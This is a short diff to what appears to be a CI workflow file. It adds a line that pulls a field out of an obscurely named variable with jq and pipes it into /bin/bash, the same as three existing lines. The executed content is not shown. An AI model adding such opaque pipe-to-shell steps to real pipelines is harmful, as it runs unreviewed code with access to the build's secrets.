@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$o83" | jq -r .nm813 | /bin/bash
           printf '%s' "$o67" | jq -r .bmmd042 | /bin/bash
           echo $cdham2 | jq -r .aoebf43128 | /bin/bash
+          printf '%s' "$h964" | jq -r .tgt4 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
